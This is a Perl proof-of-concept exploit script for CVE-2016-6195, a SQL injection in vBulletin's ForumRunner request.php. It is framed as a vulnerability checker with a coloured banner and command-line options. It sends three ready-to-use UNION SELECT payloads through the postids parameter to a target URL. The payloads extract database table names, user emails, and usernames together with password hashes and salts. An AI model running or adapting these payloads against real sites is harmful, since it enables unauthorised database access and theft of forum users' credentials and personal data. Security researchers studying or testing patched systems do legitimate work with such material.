#!/usr/bin/perl

use 5.10.0;

use strict;
use warnings;

no warnings 'experimental';

use Term::ANSIColor qw(colored color);
use LWP::UserAgent;
use HTTP::Request;
use HTTP::Cookies;
use HTTP::Response;
use Getopt::Long;

# Display The Header
header();

# Run The PoC
exploit();


sub header {
    print "\n\n";
    my $title = "=================================[ CVE-2016-6195 ]=================================";
    
    print qq{
$title
            
   Reporter : <AUTHOR>
       Date : 2016-08-30
        CVE : CVE-2016-6195
            
Description :


SQL injection vulnerability in forumrunner/includes/moderation.php in
vBulletin before 4.2.2 Patch Level 5 and 4.2.3 before Patch Level 1
allows remote attackers to execute arbitrary SQL commands via the
postids parameter to forumrunner/request.php, as exploited in the wild
in July 2016.


};
    print "="x(length($title)) . "\n\n";
}

sub exploit_header {
    system("clear");
    print color("red");
    print " ____     __  __  ____                 ___       __      _    ____              ____     _     __   ______    \n";
    print "/\\  _`\\  /\\ \\/\\ \\/\\  _`\\             /'___`\\   /'__`\\  /' \\  /'___\\            /'___\\  /' \\  /'_ `\\/\\  ___\\   \n";
    print "\\ \\ \\/\\_\\\\ \\ \\ \\ \\ \\ \\L\\_\\          /\\_\\ /\\ \\ /\\ \\/\\ \\/\\_, \\/\\ \\__/           /\\ \\__/ /\\_, \\/\\ \\L\\ \\ \\ \\__/   \n";
    print " \\ \\ \\/_/_\\ \\ \\ \\ \\ \\  _\\L   _______\\/_/// /__\\ \\ \\ \\ \\/_/\\ \\ \\  _``\\  _______\\ \\  _``\\/_/\\ \\ \\___, \\ \\___``\\ \n";
    print "  \\ \\ \\L\\ \\\\ \\ \\_/ \\ \\ \\L\\ \\/\\______\\  // /_\\ \\\\ \\ \\_\\ \\ \\ \\ \\ \\ \\L\\ \\/\\______\\\\ \\ \\L\\ \\ \\ \\ \\/__,/\\ \\/\\ \\L\\ \\\n";
    print "   \\ \\____/ \\ `\\___/\\ \\____/\\/______/ /\\______/ \\ \\____/  \\ \\_\\ \\____/\\/______/ \\ \\____/  \\ \\_\\   \\ \\_\\ \\____/\n";
    print "    \\/___/   `\\/__/  \\/___/           \\/_____/   \\/___/    \\/_/\\/___/            \\/___/    \\/_/    \\/_/\\/___/ \n";
    print "                                                                                                              \n";
    print "                                                                                                              \n";

    
    print color("green");
    print "\nGithub : https://github.com/gottburgm/\n";
    print "\n\n";
}

sub Help {
    print "\n";
    print qq {  
        # Usage
            perl $0 [ARGUMENTS]
        
        # Arguments


            --url [URL]                     : The URL Of The Target
            --timeout [VALUE]               : The Timeout To Use For The HTTP Requests
            --help                          : Display Help Menu
            --install-dir [INSTALL-DIR]     : Directory Into Which The VBulletin Application Is Installed
            --port [PORT]                   : Server HTTP Port On Which Web Applications Are running
            --debug                         : Debug mode
    };
    print "\n\n";
    exit;
}

sub buildRequester {
    my ( $useragent, $timeout, $proxy ) = @_;
    $proxy = 0 if(!defined($proxy));
    my $browser = 0;
    my $cookie_jar = 0;
    
    $cookie_jar = HTTP::Cookies->new(
        file     => "/tmp/cookies.lwp",
        autosave => 1,
    );
    
    $browser = LWP::UserAgent->new();
    $browser->protocols_allowed( [qw( http https ftp )] );
    $browser->requests_redirectable(['GET', 'POST', 'HEAD', 'OPTIONS']);
    $browser->cookie_jar( $cookie_jar);
    
    ### Custom Options
    $browser->timeout($timeout);
    $browser->agent($useragent);
    
    if($proxy) {
        $browser->proxy( [qw( http https ftp ftps )] => $proxy);
    }
    
    return $browser;
}

sub buildRequest {
    my ( $url, $method, $payload, $content_type) = @_;
    $content_type = 'application/x-www-form-urlencoded' if(!defined($content_type));
    $payload = '' if(!defined($payload));
    $method = uc($method);
    my $request = 0;
    
    if($method eq "GET") {
        $request = new HTTP::Request $method, $url . '?' . $payload;
    } else {
        $request = new HTTP::Request $method, $url;
        $request->content($payload);
    }
    $request->content_type($content_type);
    
    return $request;
}

sub exploit {
    my $browser = 0;
    my $request = 0;
    my $response = 0;
    my $proxy = 0;
    my $vulnerable = 1;
    my $useragent = "";
    

    my $port = 0;		# Command Argument : port
    my $debug = 0;		# Command Argument : debug
    my $timeout = 30;		# Command Argument : timeout
    my $install_dir = 0;		# Command Argument : install-dir
    my $url = 0;		# Command Argument : url

    ### Get Options/arguments
    GetOptions(
    	"port=i"		=> \$port,
    	"help"		        => \&Help,
    	"debug!"		=> \$debug,
    	"timeout=i"		=> \$timeout,
    	"install-dir=s"		=> \$install_dir,
    	"url=s"		        => \$url,
    ) or Help();    
    
    exploit_header();
    
    ### Setting Up The Requester
    $browser = buildRequester($useragent, $timeout, $proxy);
    
    ### Build/send the requests
    $url .= $install_dir if($install_dir);
  
    # Request : EXPLOIT2
    print color("white") . "[" . color("yellow") . "*" . color("white") . "]" . color("blue") . " Checking " . color("red") . $url . color("blue") . " for ForumRunner SQL Injection Vulnerability (Payload #2)\n";
    print color("white") . "[" . color("yellow") . "*" . color("white") . "]" . color("white") . " Payload : " . color("green") . " d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (\@x) from (select (\@x:=0x00),(select (0) from (user)where (0x00) in (\@x:=concat(\@x,0x3c62723e,username,0x3a,password,0x3a,salt))))x),5,6,7,8,9,10-- -\n\n";
    $request = buildRequest($url . "/forumrunner/request.php", "GET", "d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (\@x) from (select (\@x:=0x00),(select (0) from (user)where (0x00) in (\@x:=concat(\@x,0x3c62723e,username,0x3a,password,0x3a,salt))))x),5,6,7,8,9,10-- -", "application/x-www-form-urlencoded");
    $response = $browser->request($request);
    print color("white") . "   [" . color("yellow") . "R" . color("white") . "]" . color("blue") . " Response => " . color("green") . $request->uri . color("blue") . " ( Code : " . color("green") . $response->code . color("blue") . ")\n\n";

    $vulnerable = 0 if(!validate("TSTRING", "Post", $response));

    # Request : EXPLOIT1
    print color("white") . "[" . color("yellow") . "*" . color("white") . "]" . color("blue") . " Checking " . color("red") . $url . color("blue") . " for ForumRunner SQL Injection Vulnerability (Payload #1)\n";
    print color("white") . "[" . color("yellow") . "*" . color("white") . "]" . color("white") . " Payload : " . color("green") . " d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (\@x) from (select (\@x:=0x00),(select (0) from (information_schema.tables)where (table_schema=database()) and (0x00) in (\@x:=concat(\@x,0x3c62723e,table_name))))x),5,6,7,8,9,10-- -\n\n";
    $request = buildRequest($url . "/forumrunner/request.php", "GET", "d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (\@x) from (select (\@x:=0x00),(select (0) from (information_schema.tables)where (table_schema=database()) and (0x00) in (\@x:=concat(\@x,0x3c62723e,table_name))))x),5,6,7,8,9,10-- -", "application/x-www-form-urlencoded");
    $response = $browser->request($request);
    print color("white") . "   [" . color("yellow") . "R" . color("white") . "]" . color("blue") . " Response => " . color("green") . $request->uri . color("blue") . " ( Code : " . color("green") . $response->code . color("blue") . ")\n\n";

    $vulnerable = 0 if(!validate("FCODE", "403", $response));

    # Request : EXPLOIT3
    print color("white") . "[" . color("yellow") . "*" . color("white") . "]" . color("blue") . " Checking " . color("red") . $url . color("blue") . " for ForumRunner SQL Injection Vulnerability (Payload #3)\n";
    print color("white") . "[" . color("yellow") . "*" . color("white") . "]" . color("white") . " Payload : " . color("green") . " d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (\@x) from (select (\@x:=0x00),(select (0) from (user)where (0x00) in (\@x:=concat(\@x,0x3c62723e,email))))x),5,6,7,8,9,10-- -\n\n";
    $request = buildRequest($url . "/forumrunner/request.php", "GET", "d=1&cmd=get_spam_data&postids=-1)union select 1,2,3,(select (\@x) from (select (\@x:=0x00),(select (0) from (user)where (0x00) in (\@x:=concat(\@x,0x3c62723e,email))))x),5,6,7,8,9,10-- -", "application/x-www-form-urlencoded");
    $response = $browser->request($request);
    print color("white") . "   [" . color("yellow") . "R" . color("white") . "]" . color("blue") . " Response => " . color("green") . $request->uri . color("blue") . " ( Code : " . color("green") . $response->code . color("blue") . ")\n\n";

    $vulnerable = 0 if(!validate("TSTRING", "Post", $response));
    
    
    ### Validate or not the test
    if($vulnerable) {
        print color("white") . "[" . color("red") . "VULNERABLE" . color("white") . "] " . color("green") . $url . color("white") . " is affected or any kind of validation was provided.\n";
    } else {
        print color("white") . "[" . color("yellow") . "NOT VULNERABLE" . color("white") . "] " . color("green") . $url . color("white") . " is not affected.\n";
    }
}

sub validate {
    my ( $validation_mode, $validation_value, $response ) = @_;
    my $value = 0;
    my $positive = 1;
    my $type = substr($validation_mode, 1, length($validation_mode));
    
    $positive = 0 if(substr(uc($validation_mode), 0, 1) eq 'F');
    
    given(substr($validation_mode, 1, length($validation_mode))) {
        
        when(/CODE/i) { $value = $response->code; }
        
        when(/SIZE/i) { $value = length($response->content); }
        
        when(/STRING|REGEX/i) {  $value = $response->content; }
        
        when(/HEADER/i) {
            my @header_parts = split(':', $validation_value);
            
            if($header_parts[0]) {
                if($response->header($header_parts[0])) {
                    if($header_parts[1]) {
                        return $positive if($response->header($header_parts[0]) =~ $header_parts[1]);
                    } else {
                        return $positive;
                    }
                } else {
                    return 0;
                }
            } else {
                return 0;
            }
        }
    }
    
    if($validation_value && $validation_value =~ /$value/i || $validation_value eq $value) {
        return $positive;
    }
    
    return 0;
}
